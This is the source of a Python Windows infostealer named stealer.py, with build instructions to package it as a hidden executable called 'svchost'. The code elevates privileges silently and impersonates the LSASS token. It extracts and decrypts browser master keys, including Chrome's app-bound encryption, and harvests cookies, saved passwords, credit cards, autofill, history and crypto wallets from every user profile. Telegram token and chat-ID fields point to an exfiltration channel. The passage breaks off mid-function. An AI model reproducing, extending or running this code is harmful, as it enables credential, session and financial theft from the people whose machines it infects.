# Build with:
# py -m PyInstaller --onefile --noconsole --clean --strip --name svchost stealer.py
# Coded with <3

import sqlite3
import json
import os
import sys
import io
import winreg
import requests
import base64
import shutil
import zipfile
import binascii
import ctypes
import struct
import time
import threading
import subprocess

import windows
import windows.crypto
import windows.generated_def as gdef

from abc import ABC, abstractmethod
from contextlib import contextmanager
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime
from uuid import uuid4
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305


CREATE_NO_WINDOW = 0x08000000
SW_HIDE = 0

TG_TOKEN   = ''
TG_CHAT_ID = ''


class Environment:
    """Centralized access to system paths and environment variables."""

    LOCAL   = os.getenv('LOCALAPPDATA', '')
    ROAMING = os.getenv('APPDATA', '')
    TEMP    = os.getenv('TEMP', os.getcwd())
    USER    = os.getlogin()

    @staticmethod
    def is_admin():
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    @staticmethod
    def elevate():
        """Silent UAC elevation — SW_HIDE instead of SW_SHOWNORMAL."""

        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, SW_HIDE
        )
        sys.exit()

    @classmethod
    def all_user_roots(cls):
        """
        Discover LOCALAPPDATA and APPDATA for every user on the system.

        Solves the UAC context switch issue where ShellExecuteW("runas")
        may run as a different admin account whose LOCALAPPDATA differs.
        """
        seen = set()
        roots = []

        def _add(local, roaming):
            if local and os.path.isdir(local) and local not in seen:
                seen.add(local)
                roots.append({'local': local, 'roaming': roaming})

        _add(cls.LOCAL, cls.ROAMING)

        try:
            key = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList'
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as pk:
                for i in range(winreg.QueryInfoKey(pk)[0]):
                    try:
                        sid = winreg.EnumKey(pk, i)
                        with winreg.OpenKey(pk, sid) as sk:
                            pp = winreg.QueryValueEx(sk, 'ProfileImagePath')[0]
                            _add(
                                os.path.join(pp, 'AppData', 'Local'),
                                os.path.join(pp, 'AppData', 'Roaming'),
                            )
                    except Exception:
                        pass
        except Exception:
            pass

        sd = os.environ.get('SYSTEMDRIVE', 'C:')
        try:
            for entry in os.scandir(os.path.join(sd, os.sep, 'Users')):
                if entry.is_dir() and entry.name.lower() not in (
                    'public', 'default', 'default user', 'all users'
                ):
                    _add(
                        os.path.join(entry.path, 'AppData', 'Local'),
                        os.path.join(entry.path, 'AppData', 'Roaming'),
                    )
        except Exception:
            pass

        return roots


class TokenManager:
    """Handles LSASS process token impersonation for system-level DPAPI."""

    @staticmethod
    @contextmanager
    def impersonate_lsass():
        """Temporarily impersonate LSASS for system-level DPAPI decryption."""
        original = windows.current_thread.token
        try:
            windows.current_process.token.enable_privilege('SeDebugPrivilege')
            proc = next(p for p in windows.system.processes if p.name == 'lsass.exe')
            imp = proc.token.duplicate(
                type=gdef.TokenImpersonation,
                impersonation_level=gdef.SecurityImpersonation
            )
            windows.current_thread.token = imp
            yield
        except GeneratorExit:
            raise
        except Exception:
            yield
        finally:
            try:
                windows.current_thread.token = original
            except Exception:
                pass
            try:
                ctypes.windll.advapi32.RevertToSelf()
            except Exception:
                pass


class FileOps:
    """Silent file operations — zero console windows."""

    @staticmethod
    def _silent_copy(src, dst):
        """Copy file using Win32 API — no console window."""
        try:
            result = ctypes.windll.kernel32.CopyFileW(src, dst, False)
            return bool(result)
        except Exception:
            return False

    @staticmethod
    @contextmanager
    def temp_copy(src):
        """Copy source to temp silently, always cleanup."""
        dst = os.path.join(Environment.TEMP, f"_{uuid4().hex[:10]}")
        ok = False
        try:
            if FileOps._silent_copy(src, dst):
                ok = True
            else:
                try:
                    shutil.copy2(src, dst)
                    ok = True
                except Exception:
                    pass

            if ok:
                time.sleep(0.1)
                yield dst
            else:
                yield None
        except Exception:
            yield None
        finally:
            if ok:
                FileOps._cleanup(dst)

    @staticmethod
    def _cleanup(path, retries=4):
        for ext in ('', '-wal', '-journal', '-shm'):
            target = path + ext
            for _ in range(retries):
                try:
                    if os.path.exists(target):
                        os.remove(target)
                    break
                except Exception:
                    time.sleep(0.1)


class DatabaseOps:
    """Thread-safe SQLite query execution with retry logic."""

    @staticmethod
    def query(path, sql, retries=4):
        """Execute a read-only query with retries on database lock."""
        if not path or not os.path.exists(path):
            return []
        for attempt in range(retries):
            conn = None
            try:
                conn = sqlite3.connect(path, timeout=5, check_same_thread=False)
                return conn.execute(sql).fetchall()
            except sqlite3.OperationalError:
                if attempt < retries - 1:
                    time.sleep(0.25 * (attempt + 1))
            except Exception:
                break
            finally:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        pass
        return []


class CngDecryptor:
    """
    Windows CNG decryption with per-browser key resolution.

    Flag 3/135 in Chrome 137+ stores the AES key in the CNG Key Storage
    Provider under a browser-specific key name. Tries mapped name first,
    then falls back to Chrome and Chromium defaults.
    """

    PROVIDER = 'Microsoft Software Key Storage Provider'

    KEY_MAP = {
        'chrome':           'Google Chromekey1',
        'chrome-beta':      'Google Chrome Betakey1',
        'chrome-dev':       'Google Chrome Devkey1',
        'chrome-sxs':       'Google Chrome SxSkey1',
        'edge':             'Microsoft Edgekey1',
        'edge-beta':        'Microsoft Edge Betakey1',
        'edge-dev':         'Microsoft Edge Devkey1',
        'brave':            'Brave Browserkey1',
        'brave-beta':       'Brave Browser Betakey1',
        'brave-nightly':    'Brave Browser Nightlykey1',
        'vivaldi':          'Vivaldi Browserkey1',
        'opera':            'Opera Stablekey1',
        'opera-gx':         'Opera GX Stablekey1',
        'opera-beta':       'Opera Nextkey1',
        'opera-developer':  'Opera Developerkey1',
        'yandex':           'Yandex YandexBrowserkey1',
        'avast':            'Avast Browserkey1',
        'avg':              'AVG Browserkey1',
        'whale':            'Naver Whalekey1',
        'coccoc':           'CocCoc Browserkey1',
        'iridium':          'Iridiumkey1',
        'chromium':         'Chromiumkey1',
    }

    FALLBACK_KEYS = ['Google Chromekey1', 'Chromiumkey1']

    @classmethod
    def get_key_names(cls, browser_name):
        """Return an ordered list of CNG key names to attempt."""
        candidates = []
        mapped = cls.KEY_MAP.get(browser_name)
        if mapped:
            candidates.append(mapped)
        for fb in cls.FALLBACK_KEYS:
            if fb not in candidates:
                candidates.append(fb)
        return candidates

    @classmethod
    def decrypt(cls, data, browser_name='chrome'):
        """Attempt decryption with browser-specific key, then fallbacks."""
        for key_name in cls.get_key_names(browser_name):
            result = cls._try_decrypt(data, key_name)
            if result is not None:
                return result
        return None

    @classmethod
    def _try_decrypt(cls, data, key_name):
        """Single CNG decryption attempt with a specific key name."""
        try:
            ncrypt = ctypes.windll.NCRYPT
            hprov = gdef.NCRYPT_PROV_HANDLE()
            if ncrypt.NCryptOpenStorageProvider(ctypes.byref(hprov), cls.PROVIDER, 0) != 0:
                return None
            hkey = gdef.NCRYPT_KEY_HANDLE()
            if ncrypt.NCryptOpenKey(hprov, ctypes.byref(hkey), key_name, 0, 0) != 0:
                ncrypt.NCryptFreeObject(hprov)
                return None
            ibuf = (ctypes.c_ubyte * len(data)).from_buffer_copy(data)
            cb = gdef.DWORD(0)
            ncrypt.NCryptDecrypt(hkey, ibuf, len(ibuf), None, None, 0, ctypes.byref(cb), 0x40)
            if cb.value == 0:
                ncrypt.NCryptFreeObject(hkey)
                ncrypt.NCryptFreeObject(hprov)
                return None
            obuf = (ctypes.c_ubyte * cb.value)()
            status = ncrypt.NCryptDecrypt(
                hkey, ibuf, len(ibuf), None, obuf, cb.value, ctypes.byref(cb), 0x40
            )
            ncrypt.NCryptFreeObject(hkey)
            ncrypt.NCryptFreeObject(hprov)
            return bytes(obuf[:cb.value]) if status == 0 else None
        except Exception:
            return None


class MasterKeyExtractor:
    """
    Extracts Chromium master encryption keys across all known versions.

    v10/v11: DPAPI encrypted_key (universal)
    v20 flag 1: AES-256-GCM hardcoded key (Chrome <133)
    v20 flag 2: ChaCha20-Poly1305 hardcoded key (Chrome 133-136)
    v20 flag 3/135: CNG KSP + XOR (Chrome 137+)
    Non-Chrome fallback: raw DPAPI-decrypted bytes as key
    """

    _V20_KEYS = {
        1: ('aesgcm',  'B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787'),
        2: ('chacha',  'E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660'),
    }

    _XOR_KEY = bytes.fromhex('CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390')

    @classmethod
    def read_local_state(cls, ls_path):
        """Read and parse Local State JSON via silent temp copy."""

        with FileOps.temp_copy(ls_path) as tmp:
            if not tmp:
                return None
            try:
                with open(tmp, 'rb') as f:
                    return json.loads(f.read())
            except Exception:
                return None

    @classmethod
    def extract(cls, ls_path, v20=False, browser_name='chrome'):
        """Extract master key from Local State."""
        data = cls.read_local_state(ls_path)
        if not data:
            return None
        if v20:
            return cls._extract_v20(data, browser_name)
        return cls._extract_v10(data)

    @classmethod
    def has_v20(cls, data):
        """Check whether Local State contains an app-bound encryption key."""
        return bool(data and data.get('os_crypt', {}).get('app_bound_encrypted_key'))

    @classmethod
    def _extract_v10(cls, data):
        """Extract v10/v11 master key via DPAPI (universal)."""
        try:
            enc = data.get('os_crypt', {}).get('encrypted_key')
            if not enc:
                return None
            key = base64.b64decode(enc)[5:]
            result = CryptUnprotectData(key, None, None, None, 0)
            return result[1] if result and result[1] else None
        except Exception:
            return None

    @classmethod
    def _extract_v20(cls, data, browser_name='chrome'):
        """
        Extract v20 app-bound master key.

        LSASS → SYSTEM DPAPI → USER DPAPI → blob parse → derive.
        Falls back to raw 32-byte key for non-Chrome browsers with simpler ABE.
        """
        try:
            abek = data.get('os_crypt', {}).get('app_bound_encrypted_key')
            if not abek:
                return None
            raw = binascii.a2b_base64(abek)
            if raw[:4] != b'APPB':
                return None
            with TokenManager.impersonate_lsass():
                sys_dec = windows.crypto.dpapi.unprotect(raw[4:])
            usr_dec = windows.crypto.dpapi.unprotect(sys_dec)
            blob = cls._parse_blob(usr_dec)
            if blob:
                derived = cls._derive_v20(blob, browser_name)
                if derived:
                    return derived
            if len(usr_dec) >= 32:
                return usr_dec[-32:]
            return None
        except Exception:
            return None

    @classmethod
    def _parse_blob(cls, blob):
        """Parse a v20 key blob into its constituent cryptographic fields."""
        try:
            buf = io.BytesIO(blob)
            result = {}
            header_len = struct.unpack('<I', buf.read(4))[0]
            result['header'] = buf.read(header_len)
            content_len = struct.unpack('<I', buf.read(4))[0]
            if header_len + content_len + 8 > len(blob):
                return None
            result['flag'] = buf.read(1)[0]
            if result['flag'] in (3, 135):
                result['aes_enc'] = buf.read(32)
                result['iv']  = buf.read(12)
                result['ct']  = buf.read(32)
                result['tag'] = buf.read(16)
            elif result['flag'] in (1, 2):
                result['iv']  = buf.read(12)
                result['ct']  = buf.read(32)
                result['tag'] = buf.read(16)
            else:
                buf.seek(-60, io.SEEK_END)
                result['iv']  = buf.read(12)
                result['ct']  = buf.read(32)
                result['tag'] = buf.read(16)
            return result
        except Exception:
            return None

    @classmethod
    def _derive_v20(cls, parsed, browser_name='chrome'):
        """Derive the final v20 AES key using flag-dependent decryption."""
        try:
            flag = parsed.get('flag')
            cipher = None
            if flag in cls._V20_KEYS:
                algo, hex_key = cls._V20_KEYS[flag]
                key_bytes = bytes.fromhex(hex_key)
                cipher = AESGCM(key_bytes) if algo == 'aesgcm' else ChaCha20Poly1305(key_bytes)
            elif flag in (3, 135):
                with TokenManager.impersonate_lsass():
                    dec = CngDecryptor.decrypt(parsed['aes_enc'], browser_name)
                if not dec:
                    return None
                xored = bytes(a ^ b for a, b in zip(dec, cls._XOR_KEY))
                cipher = AESGCM(xored)
            if not cipher:
                return None
            return cipher.decrypt(parsed['iv'], parsed['ct'] + parsed['tag'], None)
        except Exception:
            return None


class CookieDecryptor:
    """
    Decrypts Chromium cookie values through a cascading fallback chain.

    Handles browser-specific metadata prefixes:
      Chrome v20 — 32-byte validation header before value
      Brave v20 — sometimes no header
      Yandex v10 — 32-byte metadata prefix before value
    """

    @staticmethod
    def _decode_value(raw):
        """
        Decode decrypted bytes to string, handling binary metadata prefixes.

        Some browsers prepend 32 bytes of non-UTF8 binary data before
        the actual cookie value. Tries clean decode, then skips prefix,
        then strips unprintable bytes.
        """
        if not raw:
            return ""
        try:
            return raw.decode('utf-8')
        except UnicodeDecodeError:
            pass
        if len(raw) > 32:
            try:
                return raw[32:].decode('utf-8')
            except UnicodeDecodeError:
                pass
        return raw.decode('utf-8', errors='ignore').strip('\x00')

    @staticmethod
    def decrypt(buff, master_key=None, v20_key=None):
        """Attempt decryption through the full fallback chain."""
        if not buff:
            return ""

        if buff[:3] in (b'v10', b'v11') and master_key:
            try:
                iv  = buff[3:15]
                ct  = buff[15:-16]
                tag = buff[-16:]
                raw = AES.new(master_key, AES.MODE_GCM, iv).decrypt_and_verify(ct, tag)
                return CookieDecryptor._decode_value(raw)
            except Exception:
                pass

        if buff[:3] == b'v20' and v20_key:
            try:
                iv  = buff[3:15]
                ct  = buff[15:-16]
                tag = buff[-16:]
                raw = AESGCM(v20_key).decrypt(iv, ct + tag, None)
                if len(raw) > 32:
                    value = CookieDecryptor._decode_value(raw[32:])
                    if value:
                        return value
                return CookieDecryptor._decode_value(raw)
            except Exception:
                pass

        try:
            raw = CryptUnprotectData(buff, None, None, None, 0)[1]
            return CookieDecryptor._decode_value(raw)
        except Exception:
            return ""

class UserAgentExtractor:
    """
    Extracts browser user agent strings from installed browsers.

    Reads the executable's PE version info and constructs the
    standard Chromium user agent string from it.
    """

    BROWSER_EXES = {
        'chrome':    os.path.join(os.getenv('PROGRAMFILES', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        'edge':      os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        'brave':     os.path.join(os.getenv('PROGRAMFILES', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        'yandex':    os.path.join(os.getenv('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'Application', 'browser.exe'),
        'vivaldi':   os.path.join(os.getenv('LOCALAPPDATA', ''), 'Vivaldi', 'Application', 'vivaldi.exe'),
        'opera':     os.path.join(os.getenv('LOCALAPPDATA', ''), 'Programs', 'Opera', 'opera.exe'),
        'opera-gx':  os.path.join(os.getenv('LOCALAPPDATA', ''), 'Programs', 'Opera GX', 'opera.exe'),
    }

    BROWSER_EXES_ALT = {
        'chrome':   os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        'edge':     os.path.join(os.getenv('PROGRAMFILES', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        'brave':    os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
    }

    @classmethod
    def get_file_version(cls, exe_path):
        """Read PE version info from an executable."""
        try:
            import ctypes.wintypes

            size = ctypes.windll.version.GetFileVersionInfoSizeW(exe_path, None)
            if not size:
                return None

            buf = ctypes.create_string_buffer(size)
            if not ctypes.windll.version.GetFileVersionInfoW(exe_path, 0, size, buf):
                return None

            vs_fixedfileinfo = ctypes.c_void_p()
            ulen = ctypes.c_uint()

            if not ctypes.windll.version.VerQueryValueW(
                buf, '\\', ctypes.byref(vs_fixedfileinfo), ctypes.byref(ulen)
            ):
                return None

            class VS_FIXEDFILEINFO(ctypes.Structure):
                _fields_ = [
                    ('dwSignature', ctypes.c_uint32),
                    ('dwStrucVersion', ctypes.c_uint32),
                    ('dwFileVersionMS', ctypes.c_uint32),
                    ('dwFileVersionLS', ctypes.c_uint32),
                ]

            info = ctypes.cast(vs_fixedfileinfo, ctypes.POINTER(VS_FIXEDFILEINFO)).contents
            major = (info.dwFileVersionMS >> 16) & 0xFFFF
            minor = info.dwFileVersionMS & 0xFFFF
            build = (info.dwFileVersionLS >> 16) & 0xFFFF
            patch = info.dwFileVersionLS & 0xFFFF

            return f'{major}.{minor}.{build}.{patch}'
        except Exception:
            return None

    @classmethod
    def get_os_version(cls):
        """Get Windows version string for UA construction."""
        try:
            ver = sys.getwindowsversion()
            return f'{ver.major}.{ver.minor}'
        except Exception:
            return '10.0'

    @classmethod
    def build_user_agent(cls, browser_name, version):
        """Construct a standard Chrome-format user agent string."""
        os_ver = cls.get_os_version()
        chrome_ver = version

        if browser_name in ('edge', 'edge-beta', 'edge-dev'):
            return (
                f'Mozilla/5.0 (Windows NT {os_ver}; Win64; x64) '
                f'AppleWebKit/537.36 (KHTML, like Gecko) '
                f'Chrome/{chrome_ver} Safari/537.36 Edg/{chrome_ver}'
            )
        elif browser_name in ('brave', 'brave-beta', 'brave-nightly'):
            return (
                f'Mozilla/5.0 (Windows NT {os_ver}; Win64; x64) '
                f'AppleWebKit/537.36 (KHTML, like Gecko) '
                f'Chrome/{chrome_ver} Safari/537.36'
            )
        elif browser_name in ('opera', 'opera-gx'):
            return (
                f'Mozilla/5.0 (Windows NT {os_ver}; Win64; x64) '
                f'AppleWebKit/537.36 (KHTML, like Gecko) '
                f'Chrome/{chrome_ver} Safari/537.36 OPR/{chrome_ver}'
            )
        elif browser_name == 'yandex':
            return (
                f'Mozilla/5.0 (Windows NT {os_ver}; Win64; x64) '
                f'AppleWebKit/537.36 (KHTML, like Gecko) '
                f'Chrome/{chrome_ver} YaBrowser/{chrome_ver} Safari/537.36'
            )
        else:
            return (
                f'Mozilla/5.0 (Windows NT {os_ver}; Win64; x64) '
                f'AppleWebKit/537.36 (KHTML, like Gecko) '
                f'Chrome/{chrome_ver} Safari/537.36'
            )

    @classmethod
    def extract(cls, browser_name):
        """Extract user agent for a given browser."""
        for source in (cls.BROWSER_EXES, cls.BROWSER_EXES_ALT):
            exe = source.get(browser_name)
            if exe and os.path.exists(exe):
                ver = cls.get_file_version(exe)
                if ver:
                    return cls.build_user_agent(browser_name, ver)

        for source in (cls.BROWSER_EXES, cls.BROWSER_EXES_ALT):
            for name, path in source.items():
                if os.path.exists(path):
                    ver = cls.get_file_version(path)
                    if ver:
                        return cls.build_user_agent(browser_name, ver)

        return None

    @classmethod
    def extract_all(cls, browser_names):
        """Extract user agents for all discovered browsers."""
        agents = {}
        for name in browser_names:
            ua = cls.extract(name)
            if ua:
                agents[name] = ua
        
        return agents


class PathDiscovery:
    """
    Discovers browser data directories across ALL user profiles.

    Three strategies: known paths → registry scan → filesystem sweep.
    Iterates every user profile to handle UAC elevation context switches.
    """

    CHROMIUM_PATHS = {
        'chrome':            ('local',   'Google\\Chrome\\User Data'),
        'chrome-beta':       ('local',   'Google\\Chrome Beta\\User Data'),
        'chrome-dev':        ('local',   'Google\\Chrome Dev\\User Data'),
        'chrome-sxs':        ('local',   'Google\\Chrome SxS\\User Data'),
        'edge':              ('local',   'Microsoft\\Edge\\User Data'),
        'edge-beta':         ('local',   'Microsoft\\Edge Beta\\User Data'),
        'edge-dev':          ('local',   'Microsoft\\Edge Dev\\User Data'),
        'brave':             ('local',   'BraveSoftware\\Brave-Browser\\User Data'),
        'brave-beta':        ('local',   'BraveSoftware\\Brave-Browser-Beta\\User Data'),
        'brave-nightly':     ('local',   'BraveSoftware\\Brave-Browser-Nightly\\User Data'),
        'vivaldi':           ('local',   'Vivaldi\\User Data'),
        'yandex':            ('local',   'Yandex\\YandexBrowser\\User Data'),
        'opera':             ('roaming', 'Opera Software\\Opera Stable'),
        'opera-gx':          ('roaming', 'Opera Software\\Opera GX Stable'),
        'opera-neon':        ('local',   'Opera Software\\Opera Neon\\User Data'),
        'opera-beta':        ('roaming', 'Opera Software\\Opera Next'),
        'opera-developer':   ('roaming', 'Opera Software\\Opera Developer'),
        'iridium':           ('local',   'Iridium\\User Data'),
        'chromium':          ('local',   'Chromium\\User Data'),
        'slimjet':           ('local',   'Slimjet\\User Data'),
        'epic':              ('local',   'Epic Privacy Browser\\User Data'),
        'amigo':             ('local',   'Amigo\\User Data'),
        'torch':             ('local',   'Torch\\User Data'),
        'kometa':            ('local',   'Kometa\\User Data'),
        'orbitum':           ('local',   'Orbitum\\User Data'),
        'cent':              ('local',   'CentBrowser\\User Data'),
        '7star':             ('local',   '7Star\\7Star\\User Data'),
        'sputnik':           ('local',   'Sputnik\\Sputnik\\User Data'),
        'uran':              ('local',   'uCozMedia\\Uran\\User Data'),
        'coccoc':            ('local',   'CocCoc\\Browser\\User Data'),
        'superbird':         ('local',   'Superbird\\User Data'),
        'dragon':            ('local',   'Comodo\\Dragon\\User Data'),
        'maxthon':           ('local',   'Maxthon\\Application\\User Data'),
        '360browser':        ('local',   '360Chrome\\Chrome\\User Data'),
        'qqbrowser':         ('local',   'Tencent\\QQBrowser\\User Data'),
        'ucbrowser':         ('local',   'UCBrowser\\User Data'),
        'liebao':            ('local',   'liebao\\User Data'),
        'elements':          ('local',   'Elements Browser\\User Data'),
        'chedot':            ('local',   'Chedot\\User Data'),
        'blisk':             ('local',   'Blisk\\User Data'),
        'whale':             ('local',   'Naver\\Naver Whale\\User Data'),
        'avast':             ('local',   'AVAST Software\\Browser\\User Data'),
        'avg':               ('local',   'AVG\\Browser\\User Data'),
        'ccleaner':          ('local',   'CCleaner\\CCleaner Browser\\User Data'),
        'ghostery':          ('local',   'Ghostery\\User Data'),
        'kinza':             ('local',   'Kinza\\User Data'),
        'polypane':          ('local',   'Polypane\\User Data'),
    }

    GECKO_ROOTS = [
        ('Mozilla',                 'Firefox'),
        ('Waterfox',                ''),
        ('librewolf',               ''),
        ('Moonchild Productions',   'Pale Moon'),
        ('Moonchild Productions',   'Basilisk'),
        ('Comodo',                  'IceDragon'),
        ('Floorp',                  ''),
        ('Mullvad',                 'Mullvad Browser'),
        ('Zen Browser',             ''),
        ('Mercury',                 ''),
    ]

    @classmethod
    def chromium(cls):
        """Discover all Chromium browsers across all user profiles."""
        found = {}
        for user_root in Environment.all_user_roots():
            for name, (scope, rel) in cls.CHROMIUM_PATHS.items():
                full = os.path.join(user_root[scope], rel)
                ls = os.path.join(full, 'Local State')
                if os.path.exists(ls) and full not in found.values():
                    key = name if name not in found else f'{name}_{len(found)}'
                    found[key] = full
        cls._scan_registry(found)
        cls._scan_filesystem(found)
        return found

    @classmethod
    def gecko(cls):
        """Discover all Gecko browsers across all user profiles."""
        results = []
        for user_root in Environment.all_user_roots():
            for vendor, product in cls.GECKO_ROOTS:
                for root in (user_root.get('roaming', ''), user_root.get('local', '')):
                    if not root:
                        continue
                    parts = [root, vendor]
                    if product:
                        parts.append(product)
                    parts.append('Profiles')
                    profiles_dir = os.path.join(*parts)
                    if not os.path.isdir(profiles_dir):
                        continue
                    try:
                        for entry in os.scandir(profiles_dir):
                            if not entry.is_dir():
                                continue
                            cookie_db = os.path.join(entry.path, 'cookies.sqlite')
                            if os.path.exists(cookie_db):
                                bname = product.lower().replace(' ', '-') if product else vendor.lower()
                                if not any(r[2] == cookie_db for r in results):
                                    results.append((bname, entry.name, cookie_db))
                    except Exception:
                        pass
        return results

    @classmethod
    def _scan_registry(cls, found):
        """Scan Windows registry for additional Chromium installations."""
        hives = [
            (winreg.HKEY_CURRENT_USER,  'Software'),
            (winreg.HKEY_LOCAL_MACHINE, 'Software'),
            (winreg.HKEY_LOCAL_MACHINE, 'Software\\WOW6432Node'),
        ]
        for hive, base in hives:
            try:
                with winreg.OpenKey(hive, base) as bk:
                    for i in range(winreg.QueryInfoKey(bk)[0]):
                        try:
                            vendor = winreg.EnumKey(bk, i)
                            with winreg.OpenKey(bk, vendor) as vk:
                                for j in range(winreg.QueryInfoKey(vk)[0]):
                                    try:
                                        product = winreg.EnumKey(vk, j)
                                        with winreg.OpenKey(vk, product) as pk:
                                            try:
                                                ud = winreg.QueryValueEx(pk, 'UserDataDir')[0]
                                                if os.path.exists(os.path.join(ud, 'Local State')) and ud not in found.values():
                                                    found[f'reg-{vendor}-{product}'.lower()[:48]] = ud
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                        except Exception:
                            pass
            except Exception:
                pass

    @classmethod
    def _scan_filesystem(cls, found):
        """Walk all users' AppData for undiscovered Chromium installs."""
        for user_root in Environment.all_user_roots():
            for root_dir in (user_root.get('local', ''), user_root.get('roaming', '')):
                if not root_dir or not os.path.isdir(root_dir):
                    continue
                try:
                    for entry in os.scandir(root_dir):
                        if not entry.is_dir():
                            continue
                        for subpath in (entry.path, os.path.join(entry.path, 'User Data')):
                            ls = os.path.join(subpath, 'Local State')
                            if os.path.exists(ls) and subpath not in found.values():
                                found[f'scan-{entry.name}'.lower()] = subpath
                except Exception:
                    pass


class BaseBrowserExtractor(ABC):
    """Abstract base for browser cookie extractors."""

    def __init__(self, cookie_store, lock):
        self._cookies = cookie_store
        self._lock = lock

    def _store(self, browser, batch):
        """Thread-safe batch insert of extracted cookies."""
        if batch:
            with self._lock:
                self._cookies.setdefault(browser, []).extend(batch)

    @abstractmethod
    def extract_all(self):
        """Extract cookies from all discovered browser instances."""

class ChromiumExtractor(BaseBrowserExtractor):
    """Extracts all browser data from Chromium-based browsers."""

    def __init__(self, cookie_store, lock, password_store=None, extra_data=None):
        super().__init__(cookie_store, lock)
        self._passwords = password_store if password_store is not None else {}
        self._extra = extra_data if extra_data is not None else {}

    def _store_passwords(self, browser, batch):
        """Thread-safe password storage."""

        if batch:
            with self._lock:
                self._passwords.setdefault(browser, []).extend(batch)

    def _store_extra(self, browser, key, data):
        """Thread-safe extra data storage."""

        if data:
            with self._lock:
                self._extra.setdefault(browser, {})[key] = data

    def extract_all(self):
        """Discover and extract cookies from every Chromium browser found."""
        browsers = PathDiscovery.chromium()
        if not browsers:
            return

        v10_keys = {}
        v20_keys = {}
        v20_candidates = {}

        for name, path in browsers.items():
            try:
                ls_path = os.path.join(path, 'Local State')
                if not os.path.exists(ls_path):
                    continue
                mk = MasterKeyExtractor.extract(ls_path, v20=False, browser_name=name)
                if mk:
                    v10_keys[name] = mk
                data = MasterKeyExtractor.read_local_state(ls_path)
                if data and MasterKeyExtractor.has_v20(data):
                    v20_candidates[name] = ls_path
            except Exception:
                pass

        for name, ls_path in v20_candidates.items():
            try:
                mk20 = MasterKeyExtractor.extract(ls_path, v20=True, browser_name=name)
                if mk20:
                    v20_keys[name] = mk20
            except Exception:
                pass
            finally:
                try:
                    ctypes.windll.advapi32.RevertToSelf()
                except Exception:
                    pass

        for name, path in browsers.items():
            try:
                self._process_chromium(
                    name, path,
                    v10_keys.get(name),
                    v20_keys.get(name),
                )
            except Exception:
                pass

    def _process_chromium(self, name, path, mk, mk20):
        """Extract ALL data from a single browser."""
        for profile in self._discover_profiles(path):
            profile_path = os.path.join(path, profile) if profile else path

            self._extract_profile_cookies(path, profile, name, mk, mk20)
            self._extract_profile_passwords(path, profile, name, mk, mk20)

            cards = DataExtractor.extract_credit_cards(profile_path, mk, mk20)
            self._store_extra(name, 'credit_cards', cards)

            autofill = DataExtractor.extract_autofill(profile_path)
            self._store_extra(name, 'autofill', autofill)

            history = DataExtractor.extract_history(profile_path)
            self._store_extra(name, 'history', history)

            downloads = DataExtractor.extract_downloads(profile_path)
            self._store_extra(name, 'downloads', downloads)

            bookmarks = DataExtractor.extract_bookmarks(profile_path)
            self._store_extra(name, 'bookmarks', bookmarks)

            wallets = DataExtractor.extract_wallets(profile_path)
            self._store_extra(name, 'wallets', wallets)

    def _extract_profile_passwords(self, base_path, profile, browser_name, mk, mk20):
        """Extract saved passwords from Login Data database."""

        profile_path = os.path.join(base_path, profile) if profile else base_path

        login_db = None
        for candidate in [
            os.path.join(profile_path, 'Login Data'),
            os.path.join(profile_path, 'Network', 'Login Data'),
        ]:
            if os.path.exists(candidate):
                login_db = candidate
                break

        if not login_db:
            return

        try:
            with FileOps.temp_copy(login_db) as tmp:
                if not tmp:
                    return
                rows = DatabaseOps.query(tmp, '''
                    SELECT origin_url, username_value, password_value
                    FROM logins
                    WHERE LENGTH(password_value) > 0
                ''')
                batch = []
                for url, username, enc_password in rows:
                    if not enc_password or not username:
                        continue
                    password = CookieDecryptor.decrypt(enc_password, mk, mk20)
                    if password:
                        batch.append({
                            'url':      url,
                            'username': username,
                            'password': password,
                        })
                
                self._store_passwords(browser_name, batch)

        except Exception:
            pass

    def _extract_profile_cookies(self, base_path, profile, browser_name, mk, mk20):
        """Extract cookies with full metadata from a single profile."""
        profile_path = os.path.join(base_path, profile) if profile else base_path
        cookie_db = self._find_cookie_db(profile_path)
        if not cookie_db:
            return
        try:
            with FileOps.temp_copy(cookie_db) as tmp:
                if not tmp:
                    return
                rows = DatabaseOps.query(tmp, '''
                    SELECT host_key, name, encrypted_value, path,
                           expires_utc, is_secure, is_httponly, samesite
                    FROM cookies
                ''')
                batch = []
                for row in rows:
                    host, nm, enc = row[0], row[1], row[2]
                    path      = row[3] if len(row) > 3 else '/'
                    expires   = row[4] if len(row) > 4 else 0
                    secure    = row[5] if len(row) > 5 else 1
                    httponly   = row[6] if len(row) > 6 else 0
                    samesite  = row[7] if len(row) > 7 else -1

                    if not enc:
                        continue
                    val = CookieDecryptor.decrypt(enc, mk, mk20)
                    if val:
                        chrome_epoch = 11644473600
                        unix_expires = max(0, (expires // 1000000) - chrome_epoch) if expires else 0

                        samesite_str = {0: 'no_restriction', 1: 'lax', 2: 'strict'}.get(samesite, 'unspecified')

                        batch.append({
                            'host':     host,
                            'name':     nm,
                            'value':    val,
                            'path':     path or '/',
                            'expires':  unix_expires if unix_expires > 0 else int(time.time()) + 31536000,
                            'secure':   bool(secure),
                            'httponly':  bool(httponly),
                            'samesite': samesite_str,
                        })
                self._store(browser_name, batch)
        except Exception:
            pass

    @staticmethod
    def _discover_profiles(base):
        """
        List all profile directories, including non-standard ones.

